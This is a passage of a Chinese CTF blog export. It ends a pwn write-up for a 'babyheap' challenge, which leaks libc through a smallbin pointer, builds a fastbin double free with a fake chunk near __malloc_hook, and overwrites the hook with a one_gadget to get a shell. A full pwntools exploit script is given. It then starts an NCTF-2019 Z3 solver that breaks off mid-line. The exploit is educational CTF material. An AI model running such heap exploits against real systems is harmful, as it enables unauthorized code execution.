src="D:%5CHexo%5Csource_posts%5C20200302201805.png" alt></p><p>而本地libc的加载地址是<code>0x7ffff7a0d000</code>，而这个地址和smallbin的fd的偏移为0x3c4b78</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x7ffff7a0d000</span> <span class="number">0x7ffff7dd1b78</span></span><br><span class="line"><span class="number">0x7ffff7a0d000</span>-&gt;<span class="number">0x7ffff7dd1b78</span> is <span class="number">0x3c4b78</span> bytes (<span class="number">0x7896f</span> words)</span><br></pre></td></tr></table></figure><p>这个偏移无论是打远程还是本地，都是不变的，我们有了这个偏移以后，就可以通过dump出fd或者bk的值，然后减去偏移，就能得到libcbase。</p><p>用代码来实现即:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dump(<span class="number">1</span>)</span><br><span class="line">c.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">main_arena = u64(c.recvuntil(<span class="string">'\n'</span>,drop = <span class="literal">True</span>)[<span class="number">-8</span>:])</span><br><span class="line">log.success(<span class="string">'main_arena + 88 = '</span> + hex(main_arena))</span><br><span class="line">offset = <span class="number">0x3c4b78</span></span><br><span class="line">libcbase = main_arena-offset</span><br></pre></td></tr></table></figure><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="选取fake-chunk"><a href="#选取fake-chunk" class="headerlink" title="选取fake_chunk"></a>选取fake_chunk</h3><p>首先要在__malloc_hook附近找到合适的地址伪造一个chunk用于fastbin double free</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook = libc.symbols[<span class="string">"__malloc_hook"</span>]+libcbase</span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br></pre></td></tr></table></figure><p><strong>注意这里为什么fake_chunk是 malloc_hook - 0x23 ？</strong></p><p>我们来看__malloc_hook附近</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ffff7dd1ac0</span> &lt;_IO_wide_data_0+<span class="number">256</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1ad0</span> &lt;_IO_wide_data_0+<span class="number">272</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1ae0</span> &lt;_IO_wide_data_0+<span class="number">288</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1af0</span> &lt;_IO_wide_data_0+<span class="number">304</span>&gt;:	<span class="number">0x00007ffff7dd0260</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b00</span> &lt;__memalign_hook&gt;:	<span class="number">0x00007ffff7a92e20</span>	<span class="number">0x00007ffff7a92a00</span></span><br><span class="line"><span class="number">0x7ffff7dd1b10</span> &lt;__malloc_hook&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="number">16</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="number">32</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="number">48</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>很遗憾，如果我们直接选取malloc_hook -0x10 或 -0x20 、 -0x30、-0x40， 那么我们的fake_chunk的chunksize都只能是0，这肯定不是我们想要的结果。</p><p>由于fake_chunk指向的是chunk header，我们至少要从-0x10 开始往前找，找啊找啊，找到一个0x7f，这个可以做chunksize, 它对应的是malloc_hook - 0x23， 所以我们的 <code>fake_chunk = malloc_hook - 0x23</code>就是这么来的。</p><p>来看一下效果</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ffff7dd1aed</span> &lt;_IO_wide_data_0+<span class="number">301</span>&gt;:	<span class="number">0xfff7dd0260000000</span>	<span class="number">0x000000000000007f</span> &lt;-- chunksize</span><br><span class="line"><span class="number">0x7ffff7dd1afd</span>:	<span class="number">0xfff7a92e20000000</span>	<span class="number">0xfff7a92a0000007f</span></span><br><span class="line"><span class="number">0x7ffff7dd1b0d</span> &lt;__realloc_hook+<span class="number">5</span>&gt;:	<span class="number">0x000000000000007f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b1d</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b2d</span> &lt;main_arena+<span class="number">13</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b3d</span> &lt;main_arena+<span class="number">29</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b4d</span> &lt;main_arena+<span class="number">45</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b5d</span> &lt;main_arena+<span class="number">61</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b6d</span> &lt;main_arena+<span class="number">77</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x5555757160000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b7d</span> &lt;main_arena+<span class="number">93</span>&gt;:	<span class="number">0x0000000000000055</span>	<span class="number">0x55557570b0000000</span></span><br></pre></td></tr></table></figure><h3 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h3><p>free掉chunk1以后修改其fd，让它的fd指向fakechunk，然后连续alloc两次就能拿到我们的fakechunk</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(fake_chunk) +p64(<span class="number">0</span>)</span><br><span class="line">fill(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br></pre></td></tr></table></figure><p>其实这里还有很多细节:</p><h4 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h4><p>我们在最开始的时候对于chunk1采用的alloc(0x40)，加上header也就是<code>0x51</code>,后来为了堆块重叠而进行了扩张，扩张了<code>0x20</code>，也就变成了<code>0x71</code>，再想想我们刚才在<code>__malloc_hook</code>附近找了许多字节，只有<code>0x7f</code>适合做fakechunk的chunksize，而当<code>0x7f</code>做chunksize的时候，其数据域的大小正好就是<code>0x60</code>，和我们扩张以后的chunk1的数据域大小保持一致，这为我们<code>fastbin double free</code>创造了条件(都在同一个fastbin链表中)。</p><h3 id="修改-malloc-hook-为execve-“-bin-sh”"><a href="#修改-malloc-hook-为execve-“-bin-sh”" class="headerlink" title="修改__malloc_hook 为execve(“/bin/sh”)"></a>修改__malloc_hook 为execve(“/bin/sh”)</h3><p>如何获取<code>execve(&quot;/bin/sh&quot;)</code>？这里用到了<code>one_gadget</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200302210210.png" alt></p><p>这四个选一个吧，不过我这四个里面只有0x4526a能用。。。</p><p>然后就是偷梁换柱咯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">3</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(libcbase + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">2</span>,len(payload),payload)</span><br></pre></td></tr></table></figure><p>由于<code>__malloc_hook</code>附近是这种结构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memalign_hook</span><br><span class="line">realloc_hook</span><br><span class="line">malloc hook</span><br></pre></td></tr></table></figure><p>所以那两个p64(0)分别对应memalign_hook和realloc_hook。</p><p>这样就能通过alloc一个chunk来触发malloc_hook里面我们修改的execve(“/bin/sh”)从而getshell了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x30</span>)<span class="comment">#这个大小随意，别太离谱就行</span></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03-完整EXP"><a href="#0x03-完整EXP" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyheap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',29105)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,size,cont)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    c.sendline(<span class="string">'2'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line">    c.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line">    c.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    c.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    c.sendline(<span class="string">'4'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x50</span>)</span><br><span class="line">alloc(<span class="number">0x40</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak libc-------------------</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">fill(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x11111</span>)</span><br><span class="line">fill(<span class="number">2</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">1</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">1</span>)</span><br><span class="line">c.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">main_arena = u64(c.recvuntil(<span class="string">'\n'</span>,drop = <span class="literal">True</span>)[<span class="number">-8</span>:])</span><br><span class="line">log.success(<span class="string">'main_arena + 88 = '</span> + hex(main_arena))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; distance 0x7ffff7a0d000 0x7ffff7dd1b78</span></span><br><span class="line"><span class="string">0x7ffff7a0d000-&gt;0x7ffff7dd1b78 is 0x3c4b78 bytes (0x7896f words)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">offset = <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line">libcbase = main_arena-offset</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------choice fake_chunk --------------</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc.symbols[<span class="string">"__malloc_hook"</span>]+libcbase</span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'fake_chunk = '</span> + hex(fake_chunk))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------fastbin double free -------------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(fake_chunk) +p64(<span class="number">0</span>)</span><br><span class="line">fill(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------change __malloc_hook to execve("/bin/sh") --------</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">3</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(libcbase + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">2</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------execve("/bin/sh") by alloc -----------------</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://blog.csdn.net/qq_33528164/article/details/79515761" target="_blank" rel="noopener">CSDN</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/" target="_blank" rel="noopener">CTF-WIKI</a></p><p><a href="https://bbs.pediy.com/thread-223461.htm" target="_blank" rel="noopener">看雪</a></p><p><a href="https://www.jianshu.com/p/d26011b0c9be" target="_blank" rel="noopener">简书</a></p><p>谢谢各位师傅们~通过这道题学到了很多。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/74165914_p0.png" alt></p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>NCTF-2019</title>
    <url>/2019/11/26/NCTF-2019/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/miku0.png" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><h1 id="0x01-Re"><a href="#0x01-Re" class="headerlink" title="0x01 Re"></a>0x01 Re</h1><h2 id="0x001-签到题"><a href="#0x001-签到题" class="headerlink" title="0x001 签到题"></a>0x001 签到题</h2><ul><li><p>题目说是考察线性代数,但是可以通过Z3快速求解。</p></li><li><p>Z3脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">solver = Solver()</span><br><span class="line">a1 = [Int(<span class="string">'a1%d'</span>%i)<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">49</span>)]</span><br><span class="line"></span><br><span class="line">solver.add(<span class="number">18564</span>== <span class="number">34</span> * a1[<span class="number">3</span>] + <span class="number">12</span> * a1[<span class="number">0</span>] + <span class="number">53</span> * a1[<span class="number">1</span>] + <span class="number">6</span> * a1[<span class="number">2</span>] + <span class="number">58</span> * a1[<span class="number">4</span>] + <span class="number">36</span> * a1[<span class="number">5</span>] + a1[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="number">37316</span>== <span class="number">27</span> * a1[<span class="number">4</span>] + <span class="number">73</span> * a1[<span class="number">3</span>] + <span class="number">12</span> * a1[<span class="number">2</span>] + <span class="number">83</span> * a1[<span class="number">0</span>] + <span class="number">85</span> * a1[<span class="number">1</span>] + <span class="number">96</span> * a1[<span class="number">5</span>] + <span class="number">52</span> * a1[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="number">32053</span>== <span class="number">24</span> * a1[<span class="number">2</span>] + <span class="number">78</span> * a1[<span class="number">0</span>] + <span class="number">53</span> * a1[<span class="number">1</span>] + <span class="number">36</span> * a1[<span class="number">3</span>] + <span class="number">86</span> * a1[<span class="number">4</span>] + <span class="number">25</span> * a1[<span class="number">5</span>] + <span class="number">46</span> * a1[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="number">33278</span>== <span class="number">78</span> * a1[<span class="number">1</span>] + <span class="number">39</span> * a1[<span class="number">0</span>] + <span class="number">52</span> * a1[<span class="number">2</span>] + <span class="number">9</span> * a1[<span class="number">3</span>] + <span class="number">62</span> * a1[<span class="number">4</span>] + <span class="number">37</span> * a1[<span class="number">5</span>] + <span class="number">84</span> * a1[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="number">23993</span>== <span class="number">48</span> * a1[<span class="number">4</span>] + <span class="number">6</span> * a1[<span class="number">1</span>] + <span class="number">23</span> * a1[<span class="number">0</span>] + <span class="number">14</span> * a1[<span class="number">2</span>] + <span class="number">74</span> * a1[<span class="number">3</span>] + <span class="number">12</span> * a1[<span class="number">5</span>] + <span class="number">83</span> * a1[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="number">33151</span>== <span class="number">15</span> * a1[<span class="number">5</span>] + <span class="number">48</span> * a1[<span class="number">4</span>] + <span class="number">92</span> * a1[<span class="number">2</span>] + <span class="number">85</span> * a1[<span class="number">1</span>] + <span class="number">27</span> * a1[<span class="number">0</span>] + <span class="number">42</span> * a1[<span class="number">3</span>] + <span class="number">72</span> * a1[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="number">15248</span>== <span class="number">26</span> * a1[<span class="number">5</span>] + <span class="number">67</span> * a1[<span class="number">3</span>] + <span class="number">6</span> * a1[<span class="number">1</span>] + <span class="number">4</span> * a1[<span class="number">0</span>] + <span class="number">3</span> * a1[<span class="number">2</span>] + <span class="number">68</span> * a1[<span class="number">6</span>])</span><br><span class="line">solver.add(<span class="number">13719</span>== <span class="number">34</span> * a1[<span class="number">10</span>] + <span class="number">12</span> * a1[<span class="number">7</span>] + <span class="number">53</span> * a1[<span class="number">8</span>] + <span class="number">6</span> * a1[<span class="number">9</span>] + <span class="number">58</span> * a1[<span class="number">11</span>] + <span class="number">36</span> * a1[<span class="number">12</span>] + a1[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="number">34137</span>== <span class="number">27</span> * a1[<span class="number">11</span>] + <span class="number">73</span> * a1[<span class="number">10</span>] + <span class="number">12</span> * a1[<span class="number">9</span>] + <span class="number">83</span> * a1[<span class="number">7</span>] + <span class="number">85</span> * a1[<span class="number">8</span>] + <span class="number">96</span> * a1[<span class="number">12</span>] + <span class="number">52</span> * a1[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="number">27391</span>== <span class="number">24</span> * a1[<span class="number">9</span>] + <span class="number">78</span> * a1[<span class="number">7</span>] + <span class="number">53</span> * a1[<span class="number">8</span>] + <span class="number">36</span> * a1[<span class="number">10</span>] + <span class="number">86</span> * a1[<span class="number">11</span>] + <span class="number">25</span> * a1[<span class="number">12</span>] + <span class="number">46</span> * a1[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="number">28639</span>== <span class="number">78</span> * a1[<span class="number">8</span>] + <span class="number">39</span> * a1[<span class="number">7</span>] + <span class="number">52</span> * a1[<span class="number">9</span>] + <span class="number">9</span> * a1[<span class="number">10</span>] + <span class="number">62</span> * a1[<span class="number">11</span>] + <span class="number">37</span> * a1[<span class="number">12</span>] + <span class="number">84</span> * a1[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="number">18453</span>== <span class="number">48</span> * a1[<span class="number">11</span>] + <span class="number">6</span> * a1[<span class="number">8</span>] + <span class="number">23</span> * a1[<span class="number">7</span>] + <span class="number">14</span> * a1[<span class="number">9</span>] + <span class="number">74</span> * a1[<span class="number">10</span>] + <span class="number">12</span> * a1[<span class="number">12</span>] + <span class="number">83</span> * a1[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="number">28465</span>== <span class="number">15</span> * a1[<span class="number">12</span>] + <span class="number">48</span> * a1[<span class="number">11</span>] + <span class="number">92</span> * a1[<span class="number">9</span>] + <span class="number">85</span> * a1[<span class="number">8</span>] + <span class="number">27</span> * a1[<span class="number">7</span>] + <span class="number">42</span> * a1[<span class="number">10</span>] + <span class="number">72</span> * a1[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="number">12384</span>== <span class="number">26</span> * a1[<span class="number">12</span>] + <span class="number">67</span> * a1[<span class="number">10</span>] + <span class="number">6</span> * a1[<span class="number">8</span>] + <span class="number">4</span> * a1[<span class="number">7</span>] + <span class="number">3</span> * a1[<span class="number">9</span>] + <span class="number">68</span> * a1[<span class="number">13</span>])</span><br><span class="line">solver.add(<span class="number">20780</span>== <span class="number">34</span> * a1[<span class="number">17</span>] + <span class="number">12</span> * a1[<span class="number">14</span>] + <span class="number">53</span> * a1[<span class="number">15</span>] + <span class="number">6</span> * a1[<span class="number">16</span>] + <span class="number">58</span> * a1[<span class="number">18</span>] + <span class="number">36</span> * a1[<span class="number">19</span>] + a1[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="number">45085</span>== <span class="number">27</span> * a1[<span class="number">18</span>] + <span class="number">73</span> * a1[<span class="number">17</span>] + <span class="number">12</span> * a1[<span class="number">16</span>] + <span class="number">83</span> * a1[<span class="number">14</span>] + <span class="number">85</span> * a1[<span class="number">15</span>] + <span class="number">96</span> * a1[<span class="number">19</span>] + <span class="number">52</span> * a1[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="number">35827</span>== <span class="number">24</span> * a1[<span class="number">16</span>] + <span class="number">78</span> * a1[<span class="number">14</span>] + <span class="number">53</span> * a1[<span class="number">15</span>] + <span class="number">36</span> * a1[<span class="number">17</span>] + <span class="number">86</span> * a1[<span class="number">18</span>] + <span class="number">25</span> * a1[<span class="number">19</span>] + <span class="number">46</span> * a1[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="number">37243</span>== <span class="number">78</span> * a1[<span class="number">15</span>] + <span class="number">39</span> * a1[<span class="number">14</span>] + <span class="number">52</span> * a1[<span class="number">16</span>] + <span class="number">9</span> * a1[<span class="number">17</span>] + <span class="number">62</span> * a1[<span class="number">18</span>] + <span class="number">37</span> * a1[<span class="number">19</span>] + <span class="number">84</span> * a1[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="number">26037</span>== <span class="number">48</span> * a1[<span class="number">18</span>] + <span class="number">6</span> * a1[<span class="number">15</span>] + <span class="number">23</span> * a1[<span class="number">14</span>] + <span class="number">14</span> * a1[<span class="number">16</span>] + <span class="number">74</span> * a1[<span class="number">17</span>] + <span class="number">12</span> * a1[<span class="number">19</span>] + <span class="number">83</span> * a1[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="number">39409</span>== <span class="number">15</span> * a1[<span class="number">19</span>] + <span class="number">48</span> * a1[<span class="number">18</span>] + <span class="number">92</span> * a1[<span class="number">16</span>] + <span class="number">85</span> * a1[<span class="number">15</span>] + <span class="number">27</span> * a1[<span class="number">14</span>] + <span class="number">42</span> * a1[<span class="number">17</span>] + <span class="number">72</span> * a1[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="number">17583</span>== <span class="number">26</span> * a1[<span class="number">19</span>] + <span class="number">67</span> * a1[<span class="number">17</span>] + <span class="number">6</span> * a1[<span class="number">15</span>] + <span class="number">4</span> * a1[<span class="number">14</span>] + <span class="number">3</span> * a1[<span class="number">16</span>] + <span class="number">68</span> * a1[<span class="number">20</span>])</span><br><span class="line">solver.add(<span class="number">20825</span>== <span class="number">34</span> * a1[<span class="number">24</span>] + <span class="number">12</span> * a1[<span class="number">21</span>] + <span class="number">53</span> * a1[<span class="number">22</span>] + <span class="number">6</span> * a1[<span class="number">23</span>] + <span class="number">58</span> * a1[<span class="number">25</span>] + <span class="number">36</span> * a1[<span class="number">26</span>] + a1[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="number">44474</span>== <span class="number">27</span> * a1[<span class="number">25</span>] + <span class="number">73</span> * a1[<span class="number">24</span>] + <span class="number">12</span> * a1[<span class="number">23</span>] + <span class="number">83</span> * a1[<span class="number">21</span>] + <span class="number">85</span> * a1[<span class="number">22</span>] + <span class="number">96</span> * a1[<span class="number">26</span>] + <span class="number">52</span> * a1[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="number">35138</span>== <span class="number">24</span> * a1[<span class="number">23</span>] + <span class="number">78</span> * a1[<span class="number">21</span>] + <span class="number">53</span> * a1[<span class="number">22</span>] + <span class="number">36</span> * a1[<span class="number">24</span>] + <span class="number">86</span> * a1[<span class="number">25</span>] + <span class="number">25</span> * a1[<span class="number">26</span>] + <span class="number">46</span> * a1[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="number">36914</span>== <span class="number">78</span> * a1[<span class="number">22</span>] + <span class="number">39</span> * a1[<span class="number">21</span>] + <span class="number">52</span> * a1[<span class="number">23</span>] + <span class="number">9</span> * a1[<span class="number">24</span>] + <span class="number">62</span> * a1[<span class="number">25</span>] + <span class="number">37</span> * a1[<span class="number">26</span>] + <span class="number">84</span> * a1[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="number">25918</span>== <span class="number">48</span> * a1[<span class="number">25</span>] + <span class="number">6</span> * a1[<span class="number">22</span>] + <span class="number">23</span> * a1[<span class="number">21</span>] + <span class="number">14</span> * a1[<span class="number">23</span>] + <span class="number">74</span> * a1[<span class="number">24</span>] + <span class="number">12</span> * a1[<span class="number">26</span>] + <span class="number">83</span> * a1[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="number">38915</span>== <span class="number">15</span> * a1[<span class="number">26</span>] + <span class="number">48</span> * a1[<span class="number">25</span>] + <span class="number">92</span> * a1[<span class="number">23</span>] + <span class="number">85</span> * a1[<span class="number">22</span>] + <span class="number">27</span> * a1[<span class="number">21</span>] + <span class="number">42</span> * a1[<span class="number">24</span>] + <span class="number">72</span> * a1[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="number">17672</span>== <span class="number">26</span> * a1[<span class="number">26</span>] + <span class="number">67</span> * a1[<span class="number">24</span>] + <span class="number">6</span> * a1[<span class="number">22</span>] + <span class="number">4</span> * a1[<span class="number">21</span>] + <span class="number">3</span> * a1[<span class="number">23</span>] + <span class="number">68</span> * a1[<span class="number">27</span>])</span><br><span class="line">solver.add(<span class="number">21219</span>== <span class="number">34</span> * a1[<span class="number">31</span>] + <span class="number">12</span> * a1[<span class="number">28</span>] + <span class="number">53</span> * a1[<span class="number">29</span>] + <span class="number">6</span> * a1[<span class="number">30</span>] + <span class="number">58</span> * a1[<span class="number">32</span>] + <span class="number">36</span> * a1[<span class="number">33</span>] + a1[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="number">43935</span>== <span class="number">27</span> * a1[<span class="number">32</span>] + <span class="number">73</span> * a1[<span class="number">31</span>] + <span class="number">12</span> * a1[<span class="number">30</span>] + <span class="number">83</span> * a1[<span class="number">28</span>] + <span class="number">85</span> * a1[<span class="number">29</span>] + <span class="number">96</span> * a1[<span class="number">33</span>] + <span class="number">52</span> * a1[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="number">37072</span>== <span class="number">24</span> * a1[<span class="number">30</span>] + <span class="number">78</span> * a1[<span class="number">28</span>] + <span class="number">53</span> * a1[<span class="number">29</span>] + <span class="number">36</span> * a1[<span class="number">31</span>] + <span class="number">86</span> * a1[<span class="number">32</span>] + <span class="number">25</span> * a1[<span class="number">33</span>] + <span class="number">46</span> * a1[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="number">39359</span>== <span class="number">78</span> * a1[<span class="number">29</span>] + <span class="number">39</span> * a1[<span class="number">28</span>] + <span class="number">52</span> * a1[<span class="number">30</span>] + <span class="number">9</span> * a1[<span class="number">31</span>] + <span class="number">62</span> * a1[<span class="number">32</span>] + <span class="number">37</span> * a1[<span class="number">33</span>] + <span class="number">84</span> * a1[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="number">27793</span>== <span class="number">48</span> * a1[<span class="number">32</span>] + <span class="number">6</span> * a1[<span class="number">29</span>] + <span class="number">23</span> * a1[<span class="number">28</span>] + <span class="number">14</span> * a1[<span class="number">30</span>] + 